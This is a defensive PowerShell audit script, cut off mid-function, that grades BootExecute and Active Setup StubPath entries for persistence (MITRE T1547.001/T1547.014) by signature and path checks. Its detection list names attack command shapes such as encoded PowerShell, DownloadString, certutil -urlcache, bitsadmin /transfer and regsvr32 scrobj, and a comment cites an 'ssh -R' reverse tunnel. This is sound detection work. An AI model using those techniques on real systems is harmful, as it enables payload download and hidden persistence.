# boot_activesetup_check.ps1 -- grade the two Section 5 autostart points the
# bats only ever DUMPED: Session Manager's BootExecute (and its sibling
# values) and Active Setup's StubPath commands. Invoked from Section 5 of
# doze_sec.bat / doze_sec_noAdmin.bat.
#
# WHY (2026-11-26, I4b): Section 5 printed
#   --- BootExecute (SAFE: autocheck autochk * only) ---
# above a raw `reg query`, and a raw `reg query ... | findstr StubPath` below
# it. Nothing compared either with anything, so neither could ever raise a
# row: Section 5 read CLEAN whatever they held. THREAT_MODEL claimed Active
# Setup coverage that did not exist.
#
# BOOTEXECUTE (T1547.001). MITRE lists the BootExecute value of
# HKLM\SYSTEM\CurrentControlSet\Control\Session Manager under Registry Run
# Keys / Startup Folder: "the default value ... is set to autocheck autochk *"
# and adversaries add programs to it (attack.mitre.org/techniques/T1547/001).
# Session Manager runs every entry as a NATIVE program, as SYSTEM, before
# Windows has started -- before any security product. Sysinternals, "Inside
# Native Applications" (learn.microsoft.com/sysinternals/resources/
# inside-native-applications): the value "contains the names and arguments of
# programs that are executed by Session Manager ... Autocheck Autochk *", and
# Session Manager "looks in the <winnt>\system32 directory for the
# executables listed". chkntfs (learn.microsoft.com/windows-server/
# administration/windows-commands/chkntfs) rewrites the autochk entry's
# arguments -- /x excludes volumes (autochk /k:C *), /c schedules one -- so
# switches and \??\<volume> arguments on autochk are Windows' own. The
# siblings BootExecuteNoPnpSync, SetupExecute and PlatformExecute are run by
# the same Session Manager and are empty or absent on a normal machine; they
# are graded by the same rule.
#   OK       autochk with only switches, `*` and \??\<volume> arguments.
#   INFO     any other entry whose image is a validly Microsoft-signed file
#            in System32 -- named, never cleared silently.
#   WARNING  a validly signed image that is not Microsoft's or not in System32
#            (antivirus boot-time scanners register here; so does
#            persistence), an image that is not on disk, one whose file could
#            not be read, or one that is not a plain file on a local fixed
#            drive (never opened).
#   CRITICAL an image in a staging path, or one that is not validly signed:
#            an unsigned program running before Windows starts, as SYSTEM.
#
# ACTIVE SETUP (T1547.014). MITRE: "Adversaries may achieve persistence by
# adding a Registry key to the Active Setup of the local machine ... under
# HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\ ... a malicious
# StubPath", run at each user's next sign-in with that user's rights
# (attack.mitre.org/techniques/T1547/014). Windows, Edge and Chrome all keep
# StubPaths here, so presence is never the finding.
#
# THE RULE (rewritten 2026-11-28 after a retrospective): what runs at each
# sign-in must trace to VALIDLY SIGNED FILES. A signature on a host program
# is evidence about that program only, never about what it is handed. The
# first version read "[OK] ... (signed by Microsoft Windows)" for
# `cmd /D /C start rundll32.exe <payload>`, for pcalua, forfiles, WMIC and
# conhost told to run another program, and for `msiexec /i <local file>`:
# 11 of 17 hostile lines. An exception written for one benign shape had
# become a way around every other rule, and "not on disk" had been decided
# from a path this check had cut wrongly.
#   The program is found the way CreateProcess finds it (Microsoft documents
#   the order for a command line without a module name: each
#   whitespace-separated prefix in turn, .exe added when the name has no
#   extension); the first try that EXISTS is the program, whatever its
#   extension. A name without a folder is looked up in System32, the Windows
#   folder and this account's PATH.
#   CRITICAL attack-shaped content (the list persistence_eval uses, plus the
#            Windows launchers url.dll FileProtocolHandler/OpenURL, shell32
#            ShellExec_RunDLL and msiexec from a URL), or a staging path
#            anywhere in the line.
#   WARNING  a program that is not validly signed, or could not be read;
#            a script host or a script file (what it runs is in a file this
#            check does not read);
#            a Windows program (Microsoft-signed, under the Windows folder:
#            rundll32, regsvr32, msiexec, pcalua, forfiles ...) handed
#            anything that is not a validly signed file: an unsigned file, a
#            URL, a network path, a relative path, a missing file where one
#            placed later would be used, or the name of another host;
#            another vendor's signed program handed an unsigned code file;
#            a Microsoft-signed program run from outside Windows and Program
#            Files (the shape of a relocated system file);
#            a program that is missing where a file placed later would run,
#            or named without its folder and found nowhere;
#            a path that is not a plain file on a local fixed drive.
#   INFO     a missing program when every place Windows would try is under
#            the Windows folder or Program Files (a stale entry); an entry
#            switched off (a DWORD IsInstalled of 0); a StubPath that names
#            no program, only arguments -- Windows' own Themes Setup
#            ('/UserInstall') and Windows Desktop Update ('U'), measured on
#            the CI runner 2026-11-26 -- when nothing by that name is where
#            Windows would look from this account.
#   OK       everything it runs and is handed is validly signed; listed with
#            the raw command, so a log carries the measured value.
#   `cmd /C start X` is not an exception to any of this: X is graded as if it
#   were the whole StubPath (so the ie4uinit -ClearIconCache entry Windows 10
#   and 11 are reported to carry reads as ie4uinit). Any other cmd line is a
#   script host.
#   NEVER OPENED: a path that is not a plain file on a local fixed drive -- a
#   network path, a mapped or removable drive, a device name, a stream.
#   Opening one would make the audit connect to a server the entry's author
#   chose and offer it the auditor's credentials, and would break -readonly's
#   "no network connections". Such a path is named as a WARNING instead.
#   NOT COVERED, and said in the lines that depend on it: another account's
#   own PATH folders (a bare name is looked up on THIS account's search
#   path), the folder Windows starts the command in, and folder permissions
#   (the Windows and Program Files tests are by name; the ACL is not read).
#   The native Installed Components key is read through the 64-bit registry
#   view, so a 32-bit PowerShell cannot read the Wow6432Node copy twice.
#
# GAPS. Absence is decided only by ItemNotFoundException (the key) or by the
# value list (the value). A key or value that could not be read is
# `[WARNING] ... NOT performed`, with its own marker, never an all-clear.
# Session Manager and the native Installed Components key exist on every
# Windows, so their absence is a gap too; the Wow6432Node twin is optional.
#
# MARKERS (in -MarkerDir): dz_bootexec.txt / dz_activesetup.txt hold the
# finding severity; dz_bootexec_gap.txt / dz_activesetup_gap.txt the gap;
# dz_bootas_done.txt is written last (the bats raise "produced no verdict"
# without it).
#
# Windows PowerShell 5.1 compatible. Read-only: registry and file reads,
# Authenticode checks, marker writes. -SelfTest runs the pure graders only,
# against a pretend disk whose answer for any file it was not given is
# "absent" -- a test double that says "signed" by default tests nothing.

[CmdletBinding()]
param(
    [string]$MarkerDir = $env:TEMP,
    # CI-only: a planted Session Manager key and Installed Components roots
    # (throwaway HKCU keys). Prefixed Ci so no name collides,
    # case-insensitively, with a variable of the script.
    [string]$CiSessionKey = '',
    [string[]]$CiActiveSetupRoots = @(),
    [switch]$SelfTest
)

$ErrorActionPreference = 'Continue'

# Strong command-content indicators, kept in sync with persistence_eval.ps1
# and startup_eval.ps1.
$script:StrongContent = @(
    '-enc(odedcommand)?\b',
    '-e\s+[A-Za-z0-9+/=]{24,}',
    'frombase64string',
    'downloadstring', 'downloadfile',
    '(invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b)[^\r\n]*https?:',
    '(iex|invoke-expression)\s*[\(\$]', '\|\s*(iex|invoke-expression)\b',
    'mshta\s+https?:', 'mshta\s+javascript', 'mshtml,runhtmlapplication',
    'certutil[^\r\n]*-urlcache', 'certutil[^\r\n]*-decode', 'bitsadmin[^\r\n]*/transfer',
    'regsvr32[^\r\n]*/i:http', 'regsvr32[^\r\n]*scrobj', 'rundll32[^\r\n]*javascript'
)
# Staging paths, anchored (\Users\Public\, never a bare \Public\: CLAUDE.md).
$script:StagingRx = '\\Temp\\|\\Downloads\\|\\Users\\Public\\|\\\$Recycle|\\ProgramData\\update'
$script:ScriptHosts = @('powershell.exe', 'pwsh.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe')
$script:ScriptExt = @('.vbs', '.vbe', '.js', '.jse', '.wsf', '.wsh', '.hta', '.ps1', '.bat', '.cmd')
$script:DllHosts = @('rundll32.exe', 'regsvr32.exe')
# A signed Windows DLL host told to launch something else: these exports run
# whatever they are handed, and msiexec installs from a URL.
$script:LauncherContent = @('fileprotocolhandler', 'shellexec_rundll', '\bopenurl\b', 'msiexec[^\r\n]*https?:')
# The name of a host inside another program's arguments (forfiles /c "cmd /c
# ...", pcalua -a powershell ...): the work is handed on.
$script:HostNameRx = '(?i)(?<![\w.\\-])(powershell|pwsh|cmd|wscript|cscript|mshta|rundll32|regsvr32|msiexec)(\.exe)?(?![\w.-])'
# File types that are code to whatever is handed them. Another vendor's
# signed program is judged only on these; a Windows program on every path.
$script:CodeExtRx = '(?i)\.(exe|dll|ocx|cpl|scr|com|pif|bat|cmd|ps1|psm1|vbs|vbe|js|jse|wsf|wsh|hta|msi|msp|mst|jar|py|lnk|inf|sct|xsl)$'
# Folders under the Windows folder that standard users can write to on a
# default install (the published AppLocker-bypass folder lists). Used only to
# make a verdict MORE cautious: a missing file there is not "stale".
$script:UserWritableWindowsRx = '(?i)\\(Tasks|tracing|Registration\\CRMLog|debug\\WIA|FxsTmp|com\\dmp|spool\\PRINTERS|spool\\SERVERS|spool\\drivers\\color|Tasks_Migrated|Crypto\\RSA\\MachineKeys)\\'
# A handed FILE that is itself a host (pcalua -a C:\Windows\System32\cmd.exe):
# the work is handed on, however validly signed that host is.
$script:HostLeaves = @('powershell.exe', 'pwsh.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe', 'rundll32.exe', 'regsvr32.exe', 'msiexec.exe')
# The programs under the Windows folder that Active Setup is known to run:
# ie4uinit and unregmp2 (measured on the CI runner), rundll32 and regsvr32
# with a signed DLL, msiexec for a per-user repair. ANY OTHER Windows tool is
# named: a tool is not what it is told to do, and one needs no file to do
# harm (ssh -R, a reverse tunnel at every sign-in, names only a host).
$script:StockSetupPrograms = @('ie4uinit.exe', 'unregmp2.exe', 'rundll32.exe', 'regsvr32.exe', 'msiexec.exe')
$script:BootValues = @('BootExecute', 'BootExecuteNoPnpSync', 'SetupExecute', 'PlatformExecute')
# Get-CreateProcessTries (pinned copy) stops after this many tries.
$script:MaxTries = 24

# Pinned shared copies (tools/lint_shared_copies.ps1): byte-identical to
# the other tools' copies.
# Live. Four states, never two: nokey|unreadable|absent|present.
function Read-RegValueState {
    param([string]$KeyPath, [string]$Name)
    $k = $null
    try { $k = Get-Item -LiteralPath $KeyPath -ErrorAction Stop }
    catch {
        if ($_.Exception -is [System.Management.Automation.ItemNotFoundException]) { return @{ State = 'nokey'; Value = $null; Kind = ''; Error = '' } }
        return @{ State = 'unreadable'; Value = $null; Kind = ''; Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message) }
    }
    try {
        if (@($k.GetValueNames()) -notcontains $Name) { return @{ State = 'absent'; Value = $null; Kind = ''; Error = '' } }
        return @{ State = 'present'; Value = $k.GetValue($Name, $null); Kind = [string]$k.GetValueKind($Name); Error = '' }
    } catch { return @{ State = 'unreadable'; Value = $null; Kind = ''; Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message) } }
}

function Test-AbsentForSure {
    # A path is absent only when its parent ANSWERS without it, or the parent
    # itself does not exist (a browser that is not installed). A parent that
    # refuses to list is not an answer.
    param([string]$Path)
    $parent = [IO.Path]::GetDirectoryName($Path); $leaf = [IO.Path]::GetFileName($Path)
    if (-not $parent -or -not $leaf) { return $false }
    try { $names = @([IO.Directory]::GetFileSystemEntries($parent)) }
    catch [System.IO.DirectoryNotFoundException] { return $true }
    catch { return $false }
    foreach ($n in $names) { if ([IO.Path]::GetFileName($n) -eq $leaf) { return $false } }
    return $true
}

# Registry key last-write time, via RegQueryInfoKey (the provider does not
# expose it); every failure degrades to $null.
function Get-RegKeyLastWrite {
    param([string]$KeyPath)
    if (-not $KeyPath) { return $null }
    try {
        if (-not ([System.Management.Automation.PSTypeName]'DozeSec.RegTime').Type) {
            Add-Type -ErrorAction Stop -Namespace DozeSec -Name RegTime -MemberDefinition @'
[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
public static extern int RegQueryInfoKey(IntPtr hKey, System.Text.StringBuilder lpClass,
    IntPtr lpcchClass, IntPtr lpReserved, IntPtr lpcSubKeys, IntPtr lpcbMaxSubKeyLen,
    IntPtr lpcbMaxClassLen, IntPtr lpcValues, IntPtr lpcbMaxValueNameLen,
    IntPtr lpcbMaxValueLen, IntPtr lpcbSecurityDescriptor, out long lpftLastWriteTime);
'@
        }
    } catch { return $null }
    $key = $null
    try {
        # Accept both provider paths (HKLM:\...) and PSPath forms.
        $p = $KeyPath -replace '^Microsoft\.PowerShell\.Core\\Registry::', ''
        $p = $p -replace '^HKEY_LOCAL_MACHINE\\', 'HKLM:\' -replace '^HKEY_CURRENT_USER\\', 'HKCU:\'
        $key = Get-Item -LiteralPath $p -EA Stop
        $ft = [long]0
        $rc = [DozeSec.RegTime]::RegQueryInfoKey($key.Handle.DangerousGetHandle(),
            $null, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
            [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
            [IntPtr]::Zero, [ref]$ft)
        if ($rc -ne 0 -or $ft -le 0) { return $null }
        return [datetime]::FromFileTime($ft)
    } catch { return $null }
}

# WHEN did this appear? Registry times are per KEY; file times can be forged.
function Get-WhenLine {
    param([string]$KeyPath = '', [string]$FilePath = '')
    $parts = @()
    if ($KeyPath) {
        $lw = Get-RegKeyLastWrite $KeyPath
        if ($null -ne $lw) { $parts += ("registry key last modified {0}" -f $lw.ToString('yyyy-MM-dd HH:mm:ss')) }
    }
    if ($FilePath) {
        try {
            $f = Get-Item -LiteralPath $FilePath -EA Stop
            $parts += ("file written {0}" -f $f.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss'))
            # Creation AFTER last-write is the classic timestomp tell, so show
            # creation whenever the two disagree in either direction.
            if ($f.CreationTime -and $f.CreationTime -ne $f.LastWriteTime) {
                $parts += ("created {0}" -f $f.CreationTime.ToString('yyyy-MM-dd HH:mm:ss'))
            }
        } catch {}
    }
    if ($parts.Count -eq 0) { return $null }
    return ("  when: {0}" -f ($parts -join '  |  '))
}

$script:whenCaveatShown = $false
function Write-WhenCaveat {
    if ($script:whenCaveatShown) { return }
    $script:whenCaveatShown = $true
    '  note: registry times are per KEY (any value change updates them) and file times can be forged (timestomping, T1070.006) -- treat them as leads, not proof.'
}

# PURE. The tries CreateProcess makes for an UNQUOTED command line, in order
# (Microsoft, CreateProcessW with no module name): one per whitespace-
# separated prefix, taken as-is when its last path component has a dot, with
# .exe appended when it has none. Returns @( @{ Try; ArgLike } ).
function Get-CreateProcessTries {
    param([string]$CommandLine)
    $out = New-Object System.Collections.ArrayList
    $s = ([string]$CommandLine).TrimEnd()
    if (-not $s -or $s.StartsWith('"')) { return @() }
    $ends = New-Object System.Collections.ArrayList
    for ($i = 1; $i -lt $s.Length; $i++) {
        if (($s[$i] -eq ' ' -or $s[$i] -eq "`t") -and $s[$i - 1] -ne ' ' -and $s[$i - 1] -ne "`t") { [void]$ends.Add($i) }
    }
    [void]$ends.Add($s.Length)
    foreach ($e in $ends) {
        if ($out.Count -ge $script:MaxTries) { break }
        $pre = $s.Substring(0, $e)
        if ($pre.EndsWith('\')) { continue }
        $last = $pre.Substring($pre.LastIndexOf('\') + 1)
        $tok = @($pre -split '[ \t]+')[-1]
        $try = $(if ($last.Contains('.')) { $pre } else { $pre + '.exe' })
        [void]$out.Add(@{ Try = $try; ArgLike = ($tok -match '^[-/]') })
    }
    return @($out.ToArray())
}

# PURE. Windows path arithmetic as strings: Join-Path asks the provider for
# the drive (it fails for a drive this machine lacks, and on Linux for every
# drive), and IO.Path splits on '/' only on Linux, so the self-test would not
# mean what it means on Windows.
function Join-WinPath { param([string]$A, [string]$B) return ($A.TrimEnd('\') + '\' + $B.TrimStart('\')) }
function Get-WinLeaf { param([string]$P) return (([string]$P) -split '\\')[-1] }

# PURE. Collapse '.' and '..' and forward slashes in a drive-rooted Windows
# path, as text. "System32\..\..\ProgramData\x.exe" is not in System32.
function Get-NormalWinPath {
    param([string]$P)
    $p0 = [string]$P
    if ($p0 -notmatch '^[A-Za-z]:[\\/]') { return $p0 }
    $keep = New-Object System.Collections.Generic.List[string]
    foreach ($seg in ($p0.Substring(3) -split '[\\/]')) {
        if ($seg -eq '' -or $seg -eq '.') { continue }
        if ($seg -eq '..') { if ($keep.Count) { $keep.RemoveAt($keep.Count - 1) }; continue }
        $keep.Add($seg)
    }
    return ($p0.Substring(0, 2) + '\' + ($keep.ToArray() -join '\'))
}

# PURE. May this path be opened? Only a plain file path on a local FIXED
# drive. Not a network path, not a drive that is mapped, removable or
# missing, not a device name (CON would wait for a keyboard), not a stream.
# $DriveKind: drive letter -> the DriveType word.
function Test-OpenablePath {
    param([string]$Path, [scriptblock]$DriveKind)
    $p = [string]$Path
    if ($p -notmatch '^[A-Za-z]:\\') { return $false }
    if ($p.IndexOf(':', 2) -ge 0) { return $false }
    foreach ($seg in ($p.Substring(3) -split '\\')) {
        if ($seg -match '^(?i)(CON|PRN|AUX|NUL|COM[0-9]|LPT[0-9]|CONIN\$|CONOUT\$)(\..*)?$') { return $false }
    }
    $k = ''
    try { $k = [string](& $DriveKind $p.Substring(0, 1)) } catch { $k = '' }
    return ($k -eq 'Fixed')
}

function Get-MaxSev {
    param([string]$A, [string]$B)
    if ($A -eq 'CRITICAL' -or $B -eq 'CRITICAL') { return 'CRITICAL' }
    if ($A -eq 'WARNING'  -or $B -eq 'WARNING')  { return 'WARNING' }
    return 'OK'
}

function Write-Marker {
    param([string]$Name, [string]$Sev)
    if ($Sev -eq 'OK') { return }
    # The marker IS the route to the findings ledger; a failed write prints.
    if (-not (Test-Path -LiteralPath $MarkerDir)) {
        New-Item -ItemType Directory -Path $MarkerDir -Force -EA SilentlyContinue | Out-Null
    }
    Set-Content -LiteralPath (Join-Path $MarkerDir ("dz_{0}.txt" -f $Name)) -Value $Sev -Encoding ASCII
}

function Get-OneLine {
    param([string]$Text)
    return ((([string]$Text) -replace '\s+', ' ').Trim())
}

# The one door to the disk. $Probe: a path -> @{ State = signed|unsigned|
# unverified|absent|unread|dir; CN; Microsoft; Status; Why; RealPath }. It is
# called ONLY for a path Test-OpenablePath allows; anything else comes back
# 'notlocal' without being touched. RealPath is the path with short (8.3)
# names expanded when the probe could do that, else the path as given.
function Get-FileFacts {
    param([string]$Path, [scriptblock]$Probe, [scriptblock]$DriveKind)
    $p = Get-NormalWinPath $Path
    if (-not (Test-OpenablePath $p $DriveKind)) { return @{ State = 'notlocal'; RealPath = $p } }
    $f = $null
    try { $f = & $Probe $p } catch { $f = @{ State = 'unread'; Why = (Get-OneLine $_.Exception.Message) } }
    $g = @{ State = 'unread'; Why = 'the file probe gave no answer'; RealPath = $p }
    if ($f -is [hashtable]) { foreach ($k in @($f.Keys)) { $g[$k] = $f[$k] } }
    if (-not $g.RealPath) { $g.RealPath = $p }
    return $g
}

# PURE, by name: the ACL is not read. Under the Windows folder?
function Test-UnderWindows {
    param([string]$P, [string]$SystemRoot)
    return ([string]$P).StartsWith($SystemRoot.TrimEnd('\') + '\', [StringComparison]::OrdinalIgnoreCase)
}

# PURE, by name. A place only an administrator can put a file on a default
# install: the Windows folder (less the folders users can write), Program
# Files on the system drive, and the root of the system drive.
function Test-AdminOnlyPath {
    param([string]$P, [string]$SystemRoot)
    $q = [string]$P
    if (Test-UnderWindows $q $SystemRoot) { return ($q -notmatch $script:UserWritableWindowsRx) }
    $drive = [regex]::Escape($SystemRoot.Substring(0, 2))
    if ($q -match ('^(?i)' + $drive + '\\Program Files( \(x86\))?\\.')) { return $true }
    return ($q -match ('^(?i)' + $drive + '\\[^\\]+$'))
}

# PURE. A staging folder anywhere in the text, with forward slashes in a
# drive path read as backslashes (C:/Users/Public/x.exe is the same file).
function Test-StagingText {
    param([string]$Text)
    $t = [string]$Text
    if ($t -match $script:StagingRx) { return $true }
    foreach ($m in [regex]::Matches($t, '[A-Za-z]:[\\/][^\s"]*')) {
        if (($m.Value -replace '/', '\') -match $script:StagingRx) { return $true }
    }
    return $false
}

# PURE. The first word of a command line: a quoted path, or up to the space.
function Get-FirstToken {
    param([string]$Line)
    $l = ([string]$Line).Trim()
    if ($l.StartsWith('"')) { $e = $l.IndexOf('"', 1); if ($e -gt 1) { return $l.Substring(1, $e - 1) } }
    return ($l -split '\s+')[0]
}

# PURE. Is this BootExecute entry Windows' own disk check? autochk with only
# switches (/k:C, /q, /v, /m, /p ...), `*` and \??\<volume> arguments, with or
# without the `autocheck` keyword. Anything else -- another program, or an
# argument of another shape -- is graded on its image.
function Test-AutochkEntry {
    param([string]$Entry)
    return ([string]$Entry -match '^(?i)\s*(autocheck\s+)?autochk(\.exe)?(\s+(\*|/[a-z]+(:[^\s]*)?|\\\?\?\\([a-z]:|volume\{[0-9a-f-]+\})\\?))*\s*$')
}

# PURE. The native image a BootExecute entry runs. Session Manager takes the
# first word after the optional `autocheck` keyword and looks for it in
# System32, adding .exe; a \??\ path or a drive path names the file itself.
# '..' is collapsed, so a name that climbs out of System32 is not "in" it.
function Get-NativeImagePath {
    param([string]$Entry, [string]$SystemRoot = $env:SystemRoot)
    $e = ([string]$Entry).Trim() -replace '^(?i)autocheck\s+', ''
    $tok = (($e -split '\s+')[0]).Trim('"')
    if (-not $tok) { return '' }
    if ($tok -match '^\\\?\?\\') { $tok = $tok.Substring(4) }
    if ($tok -match '^(?i)\\SystemRoot\\') { $tok = $SystemRoot.TrimEnd('\') + $tok.Substring(11) }
    if ($tok -notmatch '^[A-Za-z]:\\' -and $tok -notmatch '^\\\\') { $tok = Join-WinPath (Join-WinPath $SystemRoot 'System32') $tok }
    if ((Get-WinLeaf $tok) -notmatch '\.') { $tok = $tok + '.exe' }
    return (Get-NormalWinPath $tok)
}

# PURE. One BootExecute-family entry. $Facts is Get-FileFacts' answer for the
# image.
function Get-BootEntryVerdict {
    param([string]$Value, [string]$Entry, [string]$Image, $Facts, [string]$SystemRoot = $env:SystemRoot)
    $e = Get-OneLine $Entry
    if (Test-AutochkEntry $e) { return @{ Sev = 'OK'; Line = "[OK] ${Value}: $e (Windows' boot-time disk check, the stock entry)" } }
    $run = "$Value entry '$e' runs $Image before Windows starts, as SYSTEM"
    if (Test-StagingText $Image) { return @{ Sev = 'CRITICAL'; Line = "[CRITICAL] $run, from a staging path (T1547.001)." } }
    $st = [string]$Facts.State
    if ($st -eq 'notlocal') { return @{ Sev = 'WARNING'; Line = "[WARNING] $Value entry '$e' names $Image, which is not a plain file on a local fixed drive -- not opened by this audit. Session Manager would run it before Windows starts (T1547.001)." } }
    if ($st -eq 'absent' -or $st -eq 'dir') { return @{ Sev = 'WARNING'; Line = "[WARNING] $Value entry '$e' names $Image, which is not on disk -- Windows skips it at boot. A leftover of uninstalled software, or an implant whose file was removed or is yet to be dropped (T1547.001)." } }
    if ($st -eq 'unread') { return @{ Sev = 'WARNING'; Line = "[WARNING] $Value entry '$e' names $Image, whose file could not be read ($($Facts.Why)) -- not graded (T1547.001)." } }
    if ($st -eq 'unverified') { return @{ Sev = 'WARNING'; Line = "[WARNING] $run, and its signature could not be verified ($($Facts.Why)) (T1547.001)." } }
    if ($st -ne 'signed') { return @{ Sev = 'CRITICAL'; Line = "[CRITICAL] $run, and it is not validly signed ($($Facts.Status)) (T1547.001)." } }
    $sys32 = (Join-WinPath $SystemRoot 'System32') + '\'
    $real = [string]$Facts.RealPath
    if (-not $real) { $real = $Image }
    if ($Facts.Microsoft -and $real.StartsWith($sys32, [StringComparison]::OrdinalIgnoreCase)) {
        return @{ Sev = 'OK'; Line = "[INFO] $Value entry '$e' runs $Image, validly signed by $($Facts.CN) -- a Windows native program in System32; context, not a finding." }
    }
    return @{ Sev = 'WARNING'; Line = "[WARNING] $run -- signed by $($Facts.CN). Antivirus boot-time scanners register here; anything else is persistence (T1547.001)." }
}

# PURE. The BootExecute family as a whole. $Reads maps each value name to a
# Read-RegValueState answer; $Probe and $DriveKind are Get-FileFacts'.
function Get-BootReport {
    param([hashtable]$Reads, [scriptblock]$Probe, [scriptblock]$DriveKind, [string]$KeyLabel, [string]$SystemRoot = $env:SystemRoot)
    $lines = New-Object System.Collections.Generic.List[string]
    $sev = 'OK'; $gap = 'OK'; $hits = New-Object System.Collections.Generic.List[string]
    $n = 0
    foreach ($v in $script:BootValues) {
        $r = $Reads[$v]
        if ($null -eq $r) { continue }
        if ($r.State -eq 'nokey') {
            if ($v -eq 'BootExecute') { $lines.Add("[WARNING] BootExecute check NOT performed -- the Session Manager key ($KeyLabel) is not there. Every Windows has it, so the read did not reach the real key; a program run before Windows starts would go unseen (T1547.001)."); $gap = 'WARNING' }
            continue
        }
        if ($r.State -eq 'unreadable') {
            $lines.Add("[WARNING] $v check NOT performed -- $KeyLabel could not be read ($($r.Error)), so a program run before Windows starts would go unseen (T1547.001).")
            $gap = 'WARNING'; continue
        }
        if ($r.State -eq 'absent') {
            if ($v -eq 'BootExecute') { $lines.Add("[INFO] BootExecute value absent -- Windows normally holds 'autocheck autochk *' there, so the boot-time disk check is not registered. Nothing runs from it.") }
            continue
        }
        $entries = @($r.Value | ForEach-Object { [string]$_ } | Where-Object { $_.Trim() })
        foreach ($e in $entries) {
            $n++
            $img = ''
            if (-not (Test-AutochkEntry $e)) { $img = Get-NativeImagePath -Entry $e -SystemRoot $SystemRoot }
            $facts = @{ State = 'signed' }
            if ($img -and -not (Test-StagingText $img)) { $facts = Get-FileFacts $img $Probe $DriveKind }
            $x = Get-BootEntryVerdict -Value $v -Entry $e -Image $img -Facts $facts -SystemRoot $SystemRoot
            $lines.Add($x.Line)
            if ($x.Sev -ne 'OK') {
                $sev = Get-MaxSev $sev $x.Sev
                if ($facts.State -ne 'notlocal' -and -not (Test-StagingText $img)) { $hits.Add($img) }
            }
        }
    }
    if ($sev -eq 'OK' -and $gap -eq 'OK') { $lines.Add("[OK] BootExecute and its sibling values hold only Windows' own entries ($n graded).") }
    return @{ Lines = @($lines.ToArray()); Sev = $sev; Gap = $gap; Hits = @($hits.ToArray()) }
}

# PURE (the disk only through Get-FileFacts). The program a command line
# runs, found the way CreateProcess finds it. Returns @{ Shape = found|
# notfound|notlocal|none; Program; Facts; Rest (what follows the program);
# Tried (every place looked, in order); ArgOnly (the line starts with a '/');
# BareWord (the first word has no folder and no extension); Bare (no folder) }.
# $Which: a file name -> its full path on this account's search path, or ''.
function Resolve-StubProgram {
    param([string]$Line, [scriptblock]$Probe, [scriptblock]$DriveKind, [scriptblock]$Which, [string]$SystemRoot, [string]$SystemDrive)
    $out = @{ Shape = 'none'; Program = ''; Facts = $null; Rest = ''; Tried = @(); ArgOnly = $false; BareWord = $false; Bare = $false; First = '' }
    $l = ([string]$Line).Trim()
    if (-not $l) { return $out }
    $cands = New-Object System.Collections.Generic.List[object]
    if ($l.StartsWith('"')) {
        $end = $l.IndexOf('"', 1)
        if ($end -lt 2) { return $out }
        $q = $l.Substring(1, $end - 1).Trim()
        if (-not $q) { return $out }
        if ((Get-WinLeaf ($q -replace '/', '\')) -notmatch '\.') { $q = $q + '.exe' }
        $cands.Add(@{ Text = $q; Rest = $l.Substring($end + 1); ArgLike = $false })
    } else {
        foreach ($t in @(Get-CreateProcessTries $l)) {
            $try = [string]$t.Try
            $pre = $try
            if (-not $l.StartsWith($try, [StringComparison]::OrdinalIgnoreCase)) { $pre = $try.Substring(0, [Math]::Max(0, $try.Length - 4)) }
            $cands.Add(@{ Text = $try; Rest = $l.Substring([Math]::Min($pre.Length, $l.Length)); ArgLike = [bool]$t.ArgLike })
        }
    }
    if ($cands.Count -eq 0) { return $out }
    $firstText = [string]$cands[0].Text
    $out.First = $firstText
    $out.Bare = ($firstText -notmatch '[\\/]')
    $out.ArgOnly = ($firstText -match '^/[^/]')
    $out.BareWord = ($out.Bare -and ((Get-FirstToken $l) -notmatch '\.'))
    $out.Shape = 'notfound'
    $tried = New-Object System.Collections.Generic.List[string]
    for ($i = 0; $i -lt $cands.Count; $i++) {
        $c = $cands[$i]
        # Past the first word, a try whose last word is a switch is already
        # in the arguments: no program is named there.
        if ($i -gt 0 -and $c.ArgLike) { break }
        $text = [string]$c.Text
        $path = ''
        if ($text -match '^\\\\' -or $text -match '^//') {
            $out.Shape = 'notlocal'; $out.Program = $text; $out.Tried = @($tried.ToArray())
            return $out
        }
        if ($text -match '^[A-Za-z]:[\\/]') { $path = $text }
        elseif ($text -match '^[\\/]') { $path = $SystemDrive.TrimEnd('\') + '\' + (($text -replace '/', '\').TrimStart('\')) }
        elseif ($text -match '[\\/]') {
            # A relative path with a folder lands wherever Windows starts the
            # command; a name without a folder has no later try with one.
            if ($out.Bare) { break }
            [void]$tried.Add($text); continue
        } else {
            $w = ''
            try { $w = [string](& $Which $text) } catch { $w = '' }
            if (-not $w) { [void]$tried.Add($text); continue }
            $path = $w
        }
        $f = Get-FileFacts $path $Probe $DriveKind
        if ($f.State -eq 'notlocal') {
            $out.Shape = 'notlocal'; $out.Program = [string]$f.RealPath; $out.Tried = @($tried.ToArray())
            return $out
        }
        [void]$tried.Add([string]$f.RealPath)
        if ($f.State -eq 'absent' -or $f.State -eq 'dir') { continue }
        $out.Shape = 'found'; $out.Program = [string]$f.RealPath; $out.Facts = $f; $out.Rest = [string]$c.Rest; $out.Tried = @($tried.ToArray())
        return $out
    }
    $out.Tried = @($tried.ToArray())
    return $out
}

# PURE. A path as an argument carries it: "<dll>,<entry>" and "<dll>#<n>" end
# at the comma, and a closing brace or bracket is not part of the name.
function Get-CutPath {
    param([string]$P)
    $q = ([string]$P).Trim().TrimEnd('}', ')', ';', "'")
    $m = [regex]::Match($q, '^(.*?\.[A-Za-z0-9]{1,5})[,#]')
    if ($m.Success) { return $m.Groups[1].Value }
    return $q.TrimEnd(',')
}

# PURE (the disk only through Get-FileFacts, to tell where an unquoted path
# with spaces ends). What a command line hands its program beyond switches,
# in order: @{ Kind = url|unc|path|bare|rel|host; Text }.
function Get-HandedItems {
    param([string]$Rest, [scriptblock]$Probe, [scriptblock]$DriveKind)
    $items = New-Object System.Collections.Generic.List[object]
    $tokens = New-Object System.Collections.Generic.List[object]
    foreach ($m in [regex]::Matches([string]$Rest, '(?:[^\s"]+|"[^"]*")+')) {
        $tokens.Add(@{ Text = ($m.Value -replace '"', ''); Quoted = ($m.Value.IndexOf('"') -ge 0) })
    }
